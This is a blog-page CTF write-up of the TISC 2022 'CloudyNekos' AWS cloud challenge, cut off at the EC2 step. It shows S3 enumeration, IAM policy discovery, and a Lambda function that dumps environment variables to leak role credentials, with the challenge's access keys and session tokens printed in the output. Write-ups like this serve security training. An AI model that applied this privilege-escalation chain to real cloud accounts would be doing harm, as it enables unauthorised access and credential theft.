<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>TISC 2022 Cloud Cloudynekos | Quentin</title><meta name=keywords content="ctf,tisc-2022,cloud,s3,lambda,aws,dynamodb,ec2,rce"><meta name=description content="CloudyNekos Challenge Description This was a Cloud challenge unlocked at level 4 that was part of the recent TISC 2022 CTF organised by CSIT. TISC 2022 was an individual CTF that is level-based and not exactly a typical jeopardy-style CTF, meaning that only 1 challenge is released at a time and only after you solve that 1 challenge do you unlock the next one. In this writeup, I will discuss my approach towards solving this particular cloud challenge."><meta name=author content="Quentin Khoo"><link rel=canonical href=https://quentinkhoo.github.io/posts/tisc-2022-cloud-cloudynekos/><link crossorigin=anonymous href=/assets/css/stylesheet.993f9097e8d870439c2a9670fc4104ef9ca11ba29707a5a8cb5095b67a2ae128.css integrity="sha256-mT+Ql+jYcEOcKpZw/EEE75yhG6KXB6Woy1CVtnoq4Sg=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://quentinkhoo.github.io/images/peepoclap.gif><link rel=icon type=image/png sizes=16x16 href=https://quentinkhoo.github.io/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=https://quentinkhoo.github.io/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=https://quentinkhoo.github.io/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=https://quentinkhoo.github.io/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="TISC 2022 Cloud Cloudynekos"><meta property="og:description" content="CloudyNekos Challenge Description This was a Cloud challenge unlocked at level 4 that was part of the recent TISC 2022 CTF organised by CSIT. TISC 2022 was an individual CTF that is level-based and not exactly a typical jeopardy-style CTF, meaning that only 1 challenge is released at a time and only after you solve that 1 challenge do you unlock the next one. In this writeup, I will discuss my approach towards solving this particular cloud challenge."><meta property="og:type" content="article"><meta property="og:url" content="https://quentinkhoo.github.io/posts/tisc-2022-cloud-cloudynekos/"><meta property="og:image" content="https://quentinkhoo.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="article:section" content="posts"><meta property="article:published_time" content="2022-09-12T00:04:00+08:00"><meta property="article:modified_time" content="2022-09-12T00:04:00+08:00"><meta property="og:site_name" content="Quentin"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://quentinkhoo.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="TISC 2022 Cloud Cloudynekos"><meta name=twitter:description content="CloudyNekos Challenge Description This was a Cloud challenge unlocked at level 4 that was part of the recent TISC 2022 CTF organised by CSIT. TISC 2022 was an individual CTF that is level-based and not exactly a typical jeopardy-style CTF, meaning that only 1 challenge is released at a time and only after you solve that 1 challenge do you unlock the next one. In this writeup, I will discuss my approach towards solving this particular cloud challenge."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":2,"name":"Posts","item":"https://quentinkhoo.github.io/posts/"},{"@type":"ListItem","position":3,"name":"TISC 2022 Cloud Cloudynekos","item":"https://quentinkhoo.github.io/posts/tisc-2022-cloud-cloudynekos/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"TISC 2022 Cloud Cloudynekos","name":"TISC 2022 Cloud Cloudynekos","description":"CloudyNekos Challenge Description This was a Cloud challenge unlocked at level 4 that was part of the recent TISC 2022 CTF organised by CSIT. TISC 2022 was an individual CTF that is level-based and not exactly a typical jeopardy-style CTF, meaning that only 1 challenge is released at a time and only after you solve that 1 challenge do you unlock the next one. In this writeup, I will discuss my approach towards solving this particular cloud challenge.","keywords":["ctf","tisc-2022","cloud","s3","lambda","aws","dynamodb","ec2","rce"],"articleBody":"CloudyNekos Challenge Description This was a Cloud challenge unlocked at level 4 that was part of the recent TISC 2022 CTF organised by CSIT. TISC 2022 was an individual CTF that is level-based and not exactly a typical jeopardy-style CTF, meaning that only 1 challenge is released at a time and only after you solve that 1 challenge do you unlock the next one. In this writeup, I will discuss my approach towards solving this particular cloud challenge.\nIntroduction The challenge starts off by pointing us towards a domain: http://d20whnyjsgpc34.cloudfront.net. Visiting the website shows you a couple of cute cat images —ฅ/ᐠ. ̫ .ᐟ\\ฅ — After I finished being distracted by those cats, I noticed the following note in the website source code comments:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u003cdiv class=\"p-5 text-center bg-light\"\u003e \u003ch1 class=\"mb-3\"\u003eCats rule the world\u003c/h1\u003e \u003ch4 class=\"mb-3\"\u003e—ฅ/ᐠ. ̫ .ᐟ\\ฅ —\u003c/h4\u003e \u003c/div\u003e So at this there were 2 things I took note of:\nThere is a passcode? There is a bucket palindromecloudynekos A bucket in Cloud context probably meant an S3 bucket and so I took the liberty to enumerate this particular s3 bucket palindromecloudynekos and see if it were publicly accessible and voila, the bucket was indeed publicly accessible and I could indeed run aws s3 ls on it!\n1 2 3 4 5 └─$ aws s3 ls s3://palindromecloudynekos/ PRE api/ PRE img/ 2022-08-23 09:16:20 34 error.html 2022-08-23 09:16:20 2257 index.html The api folder looked interesting and running aws s3 ls s3://palindromecloudynekos/api/ revealed the existence of a file notes.txt.\n1 2 └─$ aws s3 ls s3://palindromecloudynekos/api/ 2022-08-23 09:16:20 432 notes.txt So lets go ahead and copy the file out and to look at its contents with aws s3 cp s3://palindromecloudynekos/api/notes.txt . and then we would be led to the next hint, an API gateway endpoint:\n1 2 3 4 5 6 7 8 └─$ cat notes.txt # Neko Access System Invocation Notes Invoke with the passcode in the header \"x-cat-header\". The passcode is found on the cloudfront site, all lower caps and separated using underscore. https://b40yqpyjb3.execute-api.ap-southeast-1.amazonaws.com/prod/agent All EC2 computing instances should be tagged with the key: 'agent' and the value set to your username. Otherwise, the antivirus cleaner will wipe out the resources. Remember our first clue regarding a passcode? Ahhhh yes, I guess this is where it comes in handy. From the clues it seems like we have to interact with the API gateway with a custom header x-cat-header: cats_rule_the_world. Lets make this request into a script and run it to see what we get:\n1 2 3 4 5 6 7 # solve.py import requests api_url = \"https://b40yqpyjb3.execute-api.ap-southeast-1.amazonaws.com/prod/agent\" headers = {\"x-cat-header\": \"cats_rule_the_world\"} r = requests.get(api_url, headers=headers) print(r.text) 1 2 └─$ python3 solve.py {\"Message\": \"Welcome there agent! Use the credentials wisely! It should be live for the next 120 minutes! Our antivirus will wipe them out and the associated resources after the expected time usage.\", \"Access_Key\": \"AKIAQYDFBGMS6NCB2UGD\", \"Secret_Key\": \"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\"} Turns out interacting with the API gateway with the custom header returns us a set of AWS credentials. So let’s go ahead and see what our provided AWS credentials is capable of\nEnumerating AWS Credentials Permissions When given a set of AWS credentials like this, one of the first things you would like to do is to see what kind of permissions it has access to. In this case I used enumerate-iam to do my first round of enumeration to see what kind of permissions these set of credentials have access to.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 └─$ python3 enumerate-iam.py --access-key AKIAQYDFBGMS6NCB2UGD --secret-key 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 [INFO] Starting permission enumeration for access-key-id \"AKIAQYDFBGMS6NCB2UGD\" [INFO] -- Account ARN : arn:aws:iam::051751498533:user/user-66648ab7e833453d8881002651a45a47 [INFO] -- Account Id : 051751498533 [INFO] -- Account Path: user/user-66648ab7e833453d8881002651a45a47 [INFO] Attempting common-service describe / list brute force. [INFO] -- dynamodb.describe_endpoints() worked! [INFO] -- iam.list_roles() worked! [INFO] -- iam.list_instance_profiles() worked! [INFO] -- ec2.describe_route_tables() worked! [INFO] -- ec2.describe_security_groups() worked! [INFO] -- ec2.describe_regions() worked! [INFO] -- ec2.describe_subnets() worked! [INFO] -- ec2.describe_vpcs() worked! [INFO] -- sts.get_session_token() worked! [INFO] -- sts.get_caller_identity() worked! [INFO] -- ec2.describe_instance_types() worked! From the above, we can see a few interesting permissions related to the provided AWS credentials, namely:\nec2.describe_route_tables: relating to network routing information for gateways and subnets ec2.describe_security_groups: relating to EC2 security groups created ec2.describe_subnets: relating to subnets ec2.describe_vpcs: relating to EC2 VPCs iam.list_roles: relating to IAM roles that are available iam_list_instance_profiles: relating to IAM instance profiles. There were quite a lot of things to go through but lets focus on what’s interesting for now:\naws iam list-roles: Using this command I got a list of roles that were available, in which 2 of them turned out to be relevant to the challenge:\nec2_agent_role:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 { \"Path\": \"/\", \"RoleName\": \"ec2_agent_role\", \"RoleId\": \"AROAQYDFBGMSYSEMEVAEH\", \"Arn\": \"arn:aws:iam::051751498533:role/ec2_agent_role\", \"CreateDate\": \"2022-07-22T09:29:34Z\", \"AssumeRolePolicyDocument\": { \"Version\": \"2012-10-17\", \"Statement\": [ { \"Effect\": \"Allow\", \"Principal\": { \"Service\": \"ec2.amazonaws.com\" }, \"Action\": \"sts:AssumeRole\" } ] }, \"MaxSessionDuration\": 3600 }, lambda_agent_development_role:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 { \"Path\": \"/\", \"RoleName\": \"lambda_agent_development_role\", \"RoleId\": \"AROAQYDFBGMS2NDQR5JSE\", \"Arn\": \"arn:aws:iam::051751498533:role/lambda_agent_development_role\", \"CreateDate\": \"2022-07-22T09:29:34Z\", \"AssumeRolePolicyDocument\": { \"Version\": \"2012-10-17\", \"Statement\": [ { \"Effect\": \"Allow\", \"Principal\": { \"Service\": \"lambda.amazonaws.com\" }, \"Action\": \"sts:AssumeRole\" } ] }, \"MaxSessionDuration\": 3600 } Tools like enumerate-iam wouldn’t be able to tell you if you are able to run commands like aws iam-list-attached-role-policies, whereby an additional argument is required (--role-name in this case). When dealing with IAM roles, we generally want to see what kind of permissions it has by retrieving a list of policies attached to the role and then enumerating said policies for its permissions.\nIn short, we want to run 2 commands per AWS IAM role:\naws iam list-attached-role-policies --role-name aws iam get-policy-version --policy-arn --version-id Lets go ahead and run these commands for the ec2_agent_role and the lambda_development_agent_role to see what permissions it has!\nec2_agent_role:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 └─$ aws iam list-attached-role-policies --role-name ec2_agent_role 255 ⨯ { \"AttachedPolicies\": [ { \"PolicyName\": \"iam_policy_for_ec2_agent_role\", \"PolicyArn\": \"arn:aws:iam::051751498533:policy/iam_policy_for_ec2_agent_role\" } ] } └─$ aws iam get-policy-version --policy-arn arn:aws:iam::051751498533:policy/iam_policy_for_ec2_agent_role --version-id v1 { \"PolicyVersion\": { \"Document\": { \"Statement\": [ { \"Action\": [ \"dynamodb:DescribeTable\", \"dynamodb:ListTables\", \"dynamodb:Scan\", \"dynamodb:Query\" ], \"Effect\": \"Allow\", \"Resource\": \"*\", \"Sid\": \"VisualEditor0\" } ], \"Version\": \"2012-10-17\" }, \"VersionId\": \"v1\", \"IsDefaultVersion\": true, \"CreateDate\": \"2022-07-22T09:29:34Z\" } } Woah, permissions to interact with the dynamodb service! How about lambda_agent_development_role?\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 └─$ aws iam list-attached-role-policies --role-name lambda_agent_development_role { \"AttachedPolicies\": [ { \"PolicyName\": \"iam_policy_for_lambda_agent_development_role\", \"PolicyArn\": \"arn:aws:iam::051751498533:policy/iam_policy_for_lambda_agent_development_role\" } ] } └─$ aws iam get-policy-version --policy-arn arn:aws:iam::051751498533:policy/iam_policy_for_lambda_agent_development_role --version-id v1 { \"PolicyVersion\": { \"Document\": { \"Statement\": [ { \"Action\": [ \"ec2:RunInstances\", \"ec2:CreateVolume\", \"ec2:CreateTags\" ], \"Effect\": \"Allow\", \"Resource\": \"*\" }, { \"Action\": [ \"iam:PassRole\" ], \"Effect\": \"Allow\", \"Resource\": \"arn:aws:iam::051751498533:role/ec2_agent_role\", \"Sid\": \"VisualEditor2\" } ], \"Version\": \"2012-10-17\" }, \"VersionId\": \"v1\", \"IsDefaultVersion\": false, \"CreateDate\": \"2022-07-22T09:29:36Z\" } } Wow, run an ec2 instance!? But wait, before we carry on did you notice that in the ec2_agent_role, IsDefaultVersion is set to true but for lambda_agent_development_role, IsDefaultVersion is seto to false. What does this mean??\nPolicies in AWS generally have a version tag, and normally it goes v1, v2, v3….etc. Quoting from the AWS documentation: One of the versions of a managed policy is set as the default version. The policy's default version is the operative version—that is, it's the version that is in effect for all of the principal entities (users, user groups, and roles) that the managed policy is attached to.\nWhich means that we should enumerate out for the version that has IsDefaultVersion set to true to get the one in effect! Let’s do that for lambda_agent_development_role and find a version that has that set\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 └─$ aws iam get-policy-version --policy-arn arn:aws:iam::051751498533:policy/iam_policy_for_lambda_agent_development_role --version-id v2 { \"PolicyVersion\": { \"Document\": { \"Statement\": [ { \"Action\": [ \"ec2:RunInstances\", \"ec2:CreateVolume\", \"ec2:CreateTags\" ], \"Effect\": \"Allow\", \"Resource\": \"*\" }, { \"Action\": [ \"lambda:GetFunction\" ], \"Effect\": \"Allow\", \"Resource\": \"arn:aws:lambda:ap-southeast-1:051751498533:function:cat-service\" }, { \"Action\": [ \"iam:PassRole\" ], \"Effect\": \"Allow\", \"Resource\": \"arn:aws:iam::051751498533:role/ec2_agent_role\", \"Sid\": \"VisualEditor2\" } ], \"Version\": \"2012-10-17\" }, \"VersionId\": \"v2\", \"IsDefaultVersion\": true, \"CreateDate\": \"2022-08-23T13:16:26Z\" } } Indeed, we notice something new, a cat-service function!\nAlright we have additional information about these roles but, the question still begets, what can our AWS credentials do? This is where we do some deeper enumeration and run commands like aws iam list-attached-user-policies and passing in the appropriate --user-name as shown below:\n1 2 3 4 5 6 7 8 9 └─$ aws iam list-attached-user-policies --user-name $(aws sts get-caller-identity | jq .Arn | awk -F'/' '{print $2}' | tr -d '\"') { \"AttachedPolicies\": [ { \"PolicyName\": \"user-66648ab7e833453d8881002651a45a47\", \"PolicyArn\": \"arn:aws:iam::051751498533:policy/user-66648ab7e833453d8881002651a45a47\" } ] } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 └─$ aws iam get-policy-version --policy-arn arn:aws:iam::051751498533:policy/user-66648ab7e833453d8881002651a45a47 --version-id v1 { \"PolicyVersion\": { \"Document\": { \"Version\": \"2012-10-17\", \"Statement\": [ { \"Sid\": \"VisualEditor0\", \"Effect\": \"Allow\", \"Action\": [ \"iam:GetPolicy\", \"iam:GetPolicyVersion\", \"iam:ListAttachedRolePolicies\", \"iam:ListRoles\" ], \"Resource\": \"*\" }, { \"Sid\": \"VisualEditor1\", \"Effect\": \"Allow\", \"Action\": [ \"lambda:CreateFunction\", \"lambda:InvokeFunction\", \"lambda:GetFunction\" ], \"Resource\": \"arn:aws:lambda:ap-southeast-1:051751498533:function:${aws:username}-*\" }, { \"Sid\": \"VisualEditor2\", \"Effect\": \"Allow\", \"Action\": [ \"iam:ListAttachedUserPolicies\" ], \"Resource\": \"arn:aws:iam::051751498533:user/${aws:username}\" }, { \"Sid\": \"VisualEditor3\", \"Effect\": \"Allow\", \"Action\": [ \"iam:PassRole\" ], \"Resource\": \"arn:aws:iam::051751498533:role/lambda_agent_development_role\" }, { \"Sid\": \"VisualEditor4\", \"Effect\": \"Allow\", \"Action\": [ \"ec2:DescribeVpcs\", \"ec2:DescribeRegions\", \"ec2:DescribeSubnets\", \"ec2:DescribeRouteTables\", \"ec2:DescribeSecurityGroups\", \"ec2:DescribeInstanceTypes\", \"iam:ListInstanceProfiles\" ], \"Resource\": \"*\" } ] }, \"VersionId\": \"v1\", \"IsDefaultVersion\": true, \"CreateDate\": \"2022-09-10T15:52:36Z\" } } Oh, so turns out we can create a lambda function and invoke it. Not only that but our lambda function can be created with the lambda_agent_development_role!\nBefore we continue let’s take a step back and look back on what we’ve uncovered so far:\nAbusing Lambda Functions Let’s look back on our user’s policy, specifically the lambda-related permissions:\n1 2 3 4 5 6 7 8 9 10 { \"Sid\": \"VisualEditor1\", \"Effect\": \"Allow\", \"Action\": [ \"lambda:CreateFunction\", \"lambda:InvokeFunction\", \"lambda:GetFunction\" ], \"Resource\": \"arn:aws:lambda:ap-southeast-1:051751498533:function:${aws:username}-*\" } Notice that our user is able to create/invoke/get lambda functions for functions that start with the {aws:username}-. One can get the username for the provided user credentials with the following bash script:\n1 2 3 4 └─$ cat get_username.sh #!/bin/bash aws sts get-caller-identity | jq .Arn | awk -F'/' '{print $2}' |tr -d '\"' In addition, the lambda function that we create would have the lambda_agent_development_role. Let’s try to create and invoke such a lambda function, whereby our aim is to get a set of temporary AWS IAM credentials that has the lambda_agent_development_role role.\nCreating the Lambda Function The lambda function that we would attempt to create would contain the following arguments:\n--function-name: We get the {aws:username} and then concatenate an arbitrary name like -env to the end of it. --role: the role would be the lambda_agent_development_role --runtime: we will create a javascript file and therefore use a runtime environment like nodejs12.x. --handler: index.handler. an index.js file would be created and zipped as explained below --zip-file: a zip file function.zip would be created containing an index.js, which contains the following piece of code: 1 2 3 4 5 exports.handler = async function(event, context) { console.log(\"ENVIRONMENT VARIABLES\\n\" + JSON.stringify(process.env, null, 2)) console.log(\"EVENT\\n\" + JSON.stringify(event, null, 2)) return context.logStreamName } Admittedly, all these resources came from the AWS documentation, and I didn’t really have to re-invent the wheel myself too much :)\nWe then run the aws lambda create-function:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 └─$ aws lambda create-function --role arn:aws:iam::051751498533:role/lambda_agent_development_role --function-name $(./get_username.sh)-env --zip-file fileb://function.zip --handler index.handler --runtime nodejs12.x { \"FunctionName\": \"user-59b23d07b5ee4cb2a64d1e481dd4f235-env\", \"FunctionArn\": \"arn:aws:lambda:ap-southeast-1:051751498533:function:user-59b23d07b5ee4cb2a64d1e481dd4f235-env\", \"Runtime\": \"nodejs12.x\", \"Role\": \"arn:aws:iam::051751498533:role/lambda_agent_development_role\", \"Handler\": \"index.handler\", \"CodeSize\": 322, \"Description\": \"\", \"Timeout\": 3, \"MemorySize\": 128, \"LastModified\": \"2022-09-10T18:11:29.774+0000\", \"CodeSha256\": \"mh7aiyjDJPgtppb5wSC73zT6O0hWHAeBd9pJAE8UcX4=\", \"Version\": \"$LATEST\", \"TracingConfig\": { \"Mode\": \"PassThrough\" }, \"RevisionId\": \"ecd42252-5578-4e2d-bfb5-738369d59009\", \"State\": \"Pending\", \"StateReason\": \"The function is being created.\", \"StateReasonCode\": \"Creating\", \"PackageType\": \"Zip\", \"Architectures\": [ \"x86_64\" ], \"EphemeralStorage\": { \"Size\": 512 } } Invoking the Lambda Function Alright we successfully created our Lambda function! Now to invoke it! We can use the aws lambda invoke command to do so, and with some bash magic, decode our AWS credentials stored in environment variables:\n1 2 3 4 5 6 7 └─$ aws lambda invoke --function-name $(./get_username.sh)-env out --log-type Tail --query 'LogResult' --output text | base64 -d \"AWS_SESSION_TOKEN\": \"IQoJb3JpZ2luX2VjEMr//////////wEaDmFwLXNvdXRoZWFzdC0xIkcwRQIgUt1jikEuqn+cxAsPeJXC7Nv4QNmfediKulRDTIZhQVYCIQCIObdc6xKfutLqHF8n94M6543kSpb3u+mOJknkbqxDoiqsAwhjEAEaDDA1MTc1MTQ5ODUzMyIM7SzDi82+uTMrom7cKokDrwqFKKukPMw4wGtkAxycra51iT6AG8QxtEiNCbqpjkJWbT2sdvzQGj4Z6qOieknM9jQAmwTFq7UKpmGTekpmV7JAXsnCEScNsqlIGoaGUJ/7WEp4I/bK4/ZzxN7hbiva2cTPw+00pOXelh7y0cwV4QtLj6pqEVu2aSUKP6/kBnQc4mfB+WCPUqH6EFP8ZSFP5owM3ZT42AR4oB/FI7IGaw44rIx15vgZznjaWbdZJS7ZgFRNeFTCjnmpGbtB+Rb/u2CScYMmiJ+8f2f+hW+F4paYsB5StsCAQVr3+EjTdWsJXM8zlAzAXcAoQ6xxknYsxaM9xSdXPlBzs03Ec46KmfTzXa1X/p650pXw72B9uZhcwB5XAQ095UFcPBCyn1cGVePmQU05TpPnPDbL1NRXYk8IxWLHqZGwc+HB0Y2TS2AetrYW3U8lIOg6yCksJNlBFd+6qK2i1a7tpi+VsRuabYCSKQoVYCQXFK/agIsCqXU0tM8EhTSZeq9+7zZZw7Slj7eANLki6DU/MM6n85gGOp0BaqMzHU24ojdfKNF1zDG4sMhXEbOHbgrEgWILVl9yet4+n6MSl0LKKTWYhJDaMDy7fBJpfBnaqa018zt8Zcb+VeBvVDg9fn3odkgM7d97NfO0JHtRC34vf9Sm+j6WDD1HW1/ElPKw/PXmFAOk28R0SNseIfl3BVTs4o7CLGo3Qo/k6EojdGouwtZAQZkBCs+L6g19Y1GInbsKZoZChQ==\", \"AWS_SECRET_ACCESS_KEY\": \"qscguTMoPigbpOA8ZqoCDJ7NiLSe3ROHJQlfK/U4\", \"AWS_ACCESS_KEY_ID\": \"ASIAQYDFBGMS6PHR4NFX\", Alright, we now have our set of temporary AWS IAM credentials! Recalling back, this set of permissions should allow us to get the cat-service function, lets go ahead and attempt that!\nWe first set up our new temporary IAM credentials under the profile lambda:\n1 2 3 4 5 6 7 8 9 └─$ cat ~/.aws/credentials [default] aws_access_key_id = AKIAQYDFBGMS6OKAFSZK aws_secret_access_key = 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 [lambda] aws_access_key_id = ASIAQYDFBGMS6PHR4NFX aws_secret_access_key = qscguTMoPigbpOA8ZqoCDJ7NiLSe3ROHJQlfK/U4 aws_session_token = \"IQoJb3JpZ2luX2VjEMr//////////wEaDmFwLXNvdXRoZWFzdC0xIkcwRQIgUt1jikEuqn+cxAsPeJXC7Nv4QNmfediKulRDTIZhQVYCIQCIObdc6xKfutLqHF8n94M6543kSpb3u+mOJknkbqxDoiqsAwhjEAEaDDA1MTc1MTQ5ODUzMyIM7SzDi82+uTMrom7cKokDrwqFKKukPMw4wGtkAxycra51iT6AG8QxtEiNCbqpjkJWbT2sdvzQGj4Z6qOieknM9jQAmwTFq7UKpmGTekpmV7JAXsnCEScNsqlIGoaGUJ/7WEp4I/bK4/ZzxN7hbiva2cTPw+00pOXelh7y0cwV4QtLj6pqEVu2aSUKP6/kBnQc4mfB+WCPUqH6EFP8ZSFP5owM3ZT42AR4oB/FI7IGaw44rIx15vgZznjaWbdZJS7ZgFRNeFTCjnmpGbtB+Rb/u2CScYMmiJ+8f2f+hW+F4paYsB5StsCAQVr3+EjTdWsJXM8zlAzAXcAoQ6xxknYsxaM9xSdXPlBzs03Ec46KmfTzXa1X/p650pXw72B9uZhcwB5XAQ095UFcPBCyn1cGVePmQU05TpPnPDbL1NRXYk8IxWLHqZGwc+HB0Y2TS2AetrYW3U8lIOg6yCksJNlBFd+6qK2i1a7tpi+VsRuabYCSKQoVYCQXFK/agIsCqXU0tM8EhTSZeq9+7zZZw7Slj7eANLki6DU/MM6n85gGOp0BaqMzHU24ojdfKNF1zDG4sMhXEbOHbgrEgWILVl9yet4+n6MSl0LKKTWYhJDaMDy7fBJpfBnaqa018zt8Zcb+VeBvVDg9fn3odkgM7d97NfO0JHtRC34vf9Sm+j6WDD1HW1/ElPKw/PXmFAOk28R0SNseIfl3BVTs4o7CLGo3Qo/k6EojdGouwtZAQZkBCs+L6g19Y1GInbsKZoZChQ==\" We then run the aws lambda get-function command:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 ─$ aws --profile lambda --region ap-southeast-1 lambda get-function --function-name cat-service { \"Configuration\": { \"FunctionName\": \"cat-service\", \"FunctionArn\": \"arn:aws:lambda:ap-southeast-1:051751498533:function:cat-service\", \"Runtime\": \"python3.9\", \"Role\": \"arn:aws:iam::051751498533:role/lambda_agent_development_role\", \"Handler\": \"main.lambda_handler\", \"CodeSize\": 416, \"Description\": \"\", \"Timeout\": 3, \"MemorySize\": 128, \"LastModified\": \"2022-08-23T13:16:19.469+0000\", \"CodeSha256\": \"52UWd1KHAZub5aJIS953mHrKVM0mFPiVBuGahWFGaz4=\", \"Version\": \"$LATEST\", \"TracingConfig\": { \"Mode\": \"PassThrough\" }, \"RevisionId\": \"90be1b48-3339-4a78-a083-b77e285b7b8a\", \"State\": \"Active\", \"LastUpdateStatus\": \"Successful\", \"PackageType\": \"Zip\", \"Architectures\": [ \"x86_64\" ], \"EphemeralStorage\": { \"Size\": 512 } }, \"Code\": { \"RepositoryType\": \"S3\", \"Location\": \"https://awslambda-ap-se-1-tasks.s3.ap-southeast-1.amazonaws.com/snapshots/051751498533/cat-service-f02e065f-3e98-4c04-8d77-c627d6d8d5a2?versionId=XMHQ4OlZGN52Y_FiI23NgMfVyC2eL_sD\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEMr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaDmFwLXNvdXRoZWFzdC0xIkcwRQIgcFR%2ByqeFPsLsztRFsEaIgopn3O%2FbCQ97F4%2FtgRdacQ0CIQDNPJ4PAXpD2t3lwkeU5oDclmHFskzLYBcqDS4oOSmJAyrbBAhiEAQaDDI5NTMzODcwMzU4MyIMOSYKz4ikB%2FBj%2B%2FM2KrgELWb0iH%2BJs3xS4ntDTYKOgC0o707KUG77Mr5wTSvf2X8D85DmEofY%2BJt3E9BTji6Z%2BSgi6XDnavRmB%2BU9Bep9IJch1KDXpyhME%2FCU3TgmilFuifG4RMXE6G%2B1fQoAx3YzT7IGnrBDaNKDZahLIN0dBivAIr%2BdTO%2FodtdSzII66w4FvTT2EDeNpRogrdoCsTU0YyhsersYI26vHqEtRvQAoEZdv94tWfg0Q5ZoKJyHX7f7Ta5BNvl2pgSRIT84GD%2BXZqbPQ%2BjEcNaFGE4HDg1m%2BBpclTwYIW%2FNWFHf47RO%2BFFpkCPJfAohxIM2LnZrH9nZM9Fjcm4XFHwcdHsip4JG762UJQnWGsG9DD9xWhl3pMAYI%2B6u3skDKC42YZtg12WvxSaDDT3YmoPFv6%2FSapmZCSGbvuBXdkwz9wI%2FGe6MLDchr%2FCrfAGb9WJc4X%2BvVR%2FJhcNAoL2bIby43pTpXLSRWIT%2FZoXES5Ly0P05kFvNFxZkTrvXEAWLsrV53ShhO7kgJSWzvY0g%2F4%2B5EuulEiMkapp2F2FMo3aDcfKB8uCvQB0L0WouqtKlOE5Mqhy0C%2Bxq7LwEDGTSvoYPbe%2BvWcjWuGXIlQMmNEjhY%2F2aB1JOrKfkGsj3nr0li8LQeGokQuQZF7dunDnfdiR8hgg4qiWygMUEKz60s%2By23w6XGRHoqEGVT9N8NykpCsiqbb0MbwVEqwS5wF67mSFcEStxaD7hqeoxpAx6rAoZm1PKp%2F0844rX38Rpo2%2F7czC2l%2FOYBjqpAdgVxmoBzKoXM2%2FWlUi6yc19yOwnATeAuDM33gHlKNJvbiGCIY9CgvDWxVNGeh5I6m2ZbPtQzFBGmkuFHVUAnkCwLLutv%2FD%2F%2FbgtCUYiuVYo9bGoMSXZg85f27ik2d4BfuF%2Byd4WJxjBqrYKCfWWyCFAgLtLvFL8FeEQvaG0QT8TCyxUzGaGhKhrYpnsN43p7B8xSu%2BfMctTiF1vRTSHUi7sHMxAFddWlAE%3D\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Date=20220910T181953Z\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Expires=600\u0026X-Amz-Credential=ASIAUJQ4O7LP5TW7TD4A%2F20220910%2Fap-southeast-1%2Fs3%2Faws4_request\u0026X-Amz-Signature=c155a8c3de9346b2327fe9c053e01bc10e3304204b4ce81557d10eb349a38d08\" } } Oh, an interesting domain! Accessing the domain would bring us to a zip file when unzipped reveal a main.py file that contains the following piece of code:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 import boto3 def lambda_handler(event, context): # Work in Progress: Requires help from Agents! # ec2 = boto3.resource('ec2') # instances = ec2.create_instances( # ImageId=\"???\", # MinCount=1, # MaxCount=1, # InstanceType=\"t2.micro\" #) return { 'status': 200, 'results': 'This is work in progress. Agents, palindrome needs your help to complete the workflow! :3' } Based on this hint, it seems like the next step is to actually create and run an EC2 instance! Now let’s take a step back and see what we just did so far\n(During the actual CTF I actually created a reverse shell into the temporary Lambda instance. It was unnecessary but I thought it was cool to point out that it is indeed possible to execute arbitary code on the Lambda instance, and create a reverse shell although what you can do on the instance is kind of limited and for the purpose of this CTF, you really only want the temporary AWS IAM keys).\nRunning an EC2 Instance 